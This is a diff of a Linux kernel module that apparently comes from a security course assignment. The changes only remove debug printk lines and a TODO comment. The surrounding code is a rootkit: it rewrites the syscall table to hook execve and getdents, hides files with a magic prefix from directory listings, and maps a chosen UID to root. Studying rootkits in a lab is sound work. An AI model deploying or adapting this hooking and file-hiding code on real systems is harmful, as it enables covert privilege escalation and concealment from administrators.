@@ -39,11 +39,6 @@ static int root_uid;
 module_param(root_uid, int, 0);
 MODULE_PARM_DESC(root_uid, "UID to map to root");
 
-//******
-//TODO: NEEDED FOR PART C
-//	Accept magic_prefix as a kernel module parameter
-//	(see module_parm() example above)
-//******
 /*
  * Files that start with a prefix matching magic_prefix are removed from the
  * linux_dirent64* buffer that is returned to the caller of getdents()
@@ -92,18 +87,15 @@ int hook_syscall(t_syscall_hook *hook)
   if(hook->hooked)
     return 0;
 
-  printk(KERN_INFO "In hook_syscall, and hook->hooked is true\n");
-
   //Get & store the original syscall from the syscall_table using the offset
   hook->orig_func   = sys_call_table[hook->offset];
 
-  printk(KERN_INFO "Hooking offset %d. Original: %p to New:  %p\n",
+  printk(KERN_INFO "Hooking offset %d. Original: %p to New: %p\n",
                    hook->offset, hook->orig_func, hook->hook_func);
 
   set_addr_rw((unsigned long) sys_call_table);
 
   sys_call_table[hook->offset] = hook->hook_func;
-  printk(KERN_INFO "Write op to sys_call_table in hook_syscall did not crash\n");
 
   set_addr_ro((unsigned long) sys_call_table);
 
@@ -123,7 +115,7 @@ int unhook_syscall(t_syscall_hook *hook)
   if(!hook->hooked)
     return 0;
 
-  printk(KERN_INFO "Unhooking offset %d back to  %p\n",
+  printk(KERN_INFO "Unhooking offset %d back to %p\n",
                    hook->offset, hook->orig_func);
 
   set_addr_rw((unsigned long) sys_call_table);
@@ -208,13 +200,11 @@ int init_module(void)
   printk(KERN_ALERT "Syscall table loaded from %p\n", (void*) table_addr);
 
   set_addr_rw((unsigned long) sys_call_table);
-  printk(KERN_ALERT "After call to set_addr_rw\n");
 
   //Hook the syscall
   //hook_syscall(new_hook(__NR_open, (void*) &new_open)); //Uncomment to hook open()
   hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));
-  printk(KERN_ALERT "After call to hook_syscall\n");
 
   set_addr_ro((unsigned long) sys_call_table);
 
